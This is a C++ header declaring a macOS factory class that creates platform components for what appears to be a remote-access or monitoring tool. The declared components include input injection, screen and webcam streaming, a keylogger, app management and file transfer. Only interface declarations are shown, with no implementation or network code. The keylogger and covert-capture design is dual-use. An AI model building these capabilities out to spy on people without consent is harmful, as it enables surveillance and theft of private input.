#pragma once
#include "interfaces/IPlatformFactory.hpp"

namespace platform {
namespace macos {

/**
 * macOS Platform Factory
 *
 * Creates all macOS-specific HAL components
 */
class MacOSPlatformFactory : public interfaces::IPlatformFactory {
public:
    MacOSPlatformFactory() = default;
    ~MacOSPlatformFactory() override = default;

    // Factory Methods
    std::unique_ptr<interfaces::IInputInjector> create_input_injector() override;
    std::unique_ptr<interfaces::IVideoStreamer> create_screen_streamer() override;
    std::unique_ptr<interfaces::IVideoStreamer> create_webcam_streamer() override;
    std::unique_ptr<interfaces::IKeylogger> create_keylogger() override;
    std::unique_ptr<interfaces::IAppManager> create_app_manager() override;
    std::unique_ptr<interfaces::IFileTransfer> create_file_transfer() override;

    // Platform Info
    const char* platform_name() const noexcept override { return "macOS"; }
    bool is_current_platform() const noexcept override { return true; }
    bool is_fully_supported() const noexcept override { return true; }

    // Lifecycle
    void initialize() override;
    void shutdown() override;

private:
    bool initialized_ = false;
};

} // namespace macos
} // namespace platform
